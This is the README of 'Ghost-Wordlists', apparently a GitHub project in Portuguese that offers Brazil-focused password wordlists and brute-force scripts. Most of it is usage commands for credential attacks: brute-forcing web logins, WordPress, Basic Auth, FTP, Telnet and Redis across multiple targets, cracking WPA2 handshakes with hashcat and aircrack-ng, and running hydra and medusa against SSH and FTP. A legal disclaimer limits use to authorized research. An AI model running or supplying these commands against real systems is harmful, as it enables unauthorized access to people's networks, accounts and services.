# Ghost-Wordlists

<div align="center">

![Wordlists](https://img.shields.io/badge/Wordlists-Brasil%20Focused-8B0000?style=for-the-badge)
![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square&logo=python)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey?style=flat-square)
![By Gh0st-Bx1](https://img.shields.io/badge/By-Gh0st--Bx1-black?style=flat-square&logo=github)

</div>

> **AVISO LEGAL:** Este repositorio foi criado exclusivamente para fins
> educacionais e de pesquisa em seguranca. O uso destas ferramentas contra
> sistemas sem autorizacao previa e expresso por escrito e ilegal. O autor
> nao se responsabiliza pelo uso indevido deste material.

Colecao de wordlists e ferramentas de brute force focadas no contexto brasileiro.
WiFi, servicos (SSH/FTP/Telnet), aplicacoes web, bancos de dados e mais.

---

## Estrutura

```
ghost-wordlists/
├── wifi/                        # Senhas de redes WiFi
│   ├── brasil-senhas-comuns.txt    # Top senhas usadas no Brasil
│   ├── nomes-brasileiros.txt       # Nomes proprios como senha
│   ├── futebol-brasil.txt          # Times, jogadores, expressoes
│   ├── provedores/
│   │   ├── claro-net.txt           # Claro/NET defaults
│   │   ├── vivo-gvt.txt            # Vivo/GVT defaults
│   │   ├── tim.txt                 # TIM defaults
│   │   ├── oi.txt                  # Oi defaults
│   │   ├── intelbras.txt           # Roteadores Intelbras
│   │   └── outros-isps.txt         # ISPs regionais e outros
│   └── patterns/
│       └── datas-br.txt            # Padroes de datas dd/mm/yyyy
├── servicos/                    # SSH, FTP, Telnet, SMTP, etc.
│   ├── usuarios-unix.txt           # Usuarios padrao em Linux/Unix
│   └── senhas-servicos.txt         # Senhas padrao de servicos e hardware
├── web/                         # Aplicacoes web / CMS
│   ├── usuarios-web.txt            # Usuarios de CMS, paineis, intranet
│   └── senhas-webapp.txt           # Senhas fracas em ambientes web brasileiros
├── bancos-de-dados/             # MySQL, PostgreSQL, MongoDB, etc.
│   └── credenciais-db.txt          # Defaults formato usuario:senha
└── tools/
    ├── gerador.py                  # Gerador de wordlists personalizadas
    ├── ataque-web.py               # Brute force HTTP (POST/Basic/WordPress)
    └── ataque-servico.py           # Brute force FTP/Telnet/SMTP/Redis/MongoDB
```

---

## Ferramentas

### gerador.py - Gerador de Wordlists

```bash
# Gerar permutacoes de um nome
python tools/gerador.py --palavra joao --nivel 2 -o joao.txt

# Gerar padroes de data
python tools/gerador.py --data 15/03/1990 -o datas.txt

# Gerar candidatos para SSID Claro
python tools/gerador.py --ssid-claro NET_A1B2C3 -o candidatos.txt

# Gerar para provedor regional
python tools/gerador.py --provedor "MinhaNet" --cidade "Juazeiro" -o minhanet.txt

# Combinar e deduplicar wordlists
python tools/gerador.py --combinar wifi/*.txt servicos/*.txt -o completa.txt
```

### ataque-web.py - Brute Force HTTP

```bash
# Formulario POST generico
python tools/ataque-web.py --url http://alvo/login --users web/usuarios-web.txt \
    --wordlist web/senhas-webapp.txt --threads 10

# WordPress
python tools/ataque-web.py --url http://alvo/wp-login.php --user admin \
    --wordlist wifi/brasil-senhas-comuns.txt --threads 5

# Basic Auth
python tools/ataque-web.py --url http://alvo/admin --method basic \
    --users servicos/usuarios-unix.txt --wordlist servicos/senhas-servicos.txt

# Com proxy e saida JSON
python tools/ataque-web.py --url http://alvo/login --user admin \
    --wordlist web/senhas-webapp.txt --proxy http://127.0.0.1:8080 \
    --output resultados.json --resume progresso.txt
```

### ataque-servico.py - Brute Force Servicos

```bash
# FTP
python tools/ataque-servico.py --target 192.168.1.1 --service ftp \
    --users servicos/usuarios-unix.txt --wordlist servicos/senhas-servicos.txt

# Telnet
python tools/ataque-servico.py --target 192.168.0.1 --service telnet \
    --user admin --wordlist wifi/brasil-senhas-comuns.txt

# Redis sem senha (verificar acesso)
python tools/ataque-servico.py --target redis.alvo.com --service redis \
    --user ignored --wordlist servicos/senhas-servicos.txt

# Multiplos alvos com retomada
python tools/ataque-servico.py --targets-file alvos.txt --service ftp \
    --users servicos/usuarios-unix.txt --wordlist servicos/senhas-servicos.txt \
    --threads 20 --output pwned.json --resume progresso.txt
```

---

## Uso com Ferramentas Externas

```bash
# Hashcat - WiFi (WPA2 handshake)
hashcat -m 2500 handshake.hccapx wifi/brasil-senhas-comuns.txt
hashcat -m 2500 handshake.hccapx wifi/nomes-brasileiros.txt
# Combinar wordlists no hashcat
hashcat -m 2500 handshake.hccapx wifi/ --wordlist-autohex-disable

# Aircrack-ng - WiFi
aircrack-ng handshake.cap -w wifi/brasil-senhas-comuns.txt
aircrack-ng handshake.cap -w wifi/provedores/claro-net.txt

# Hydra - SSH (mais confiavel que ataque-servico.py para SSH)
hydra -L servicos/usuarios-unix.txt -P servicos/senhas-servicos.txt ssh://alvo -t 4
hydra -l admin -P web/senhas-webapp.txt http-post-form://alvo/login:u=^USER^&p=^PASS^:fail_msg

# John the Ripper
john hash.txt --wordlist=web/senhas-webapp.txt

# Medusa
medusa -H alvos.txt -U servicos/usuarios-unix.txt -P servicos/senhas-servicos.txt -M ftp
```

---

## Contribuicao e Adicoes

Para adicionar wordlists:
1. Coloque no diretorio correto (`wifi/`, `servicos/`, `web/`, `bancos-de-dados/`)
2. Adicione comentario de cabecalho com `# Descricao | Ghost-Bx1`
3. Use o `tools/gerador.py --combinar` para mesclar e deduplicar

---

By Gh0st-Bx1 | https://github.com/Ghost-Bx1
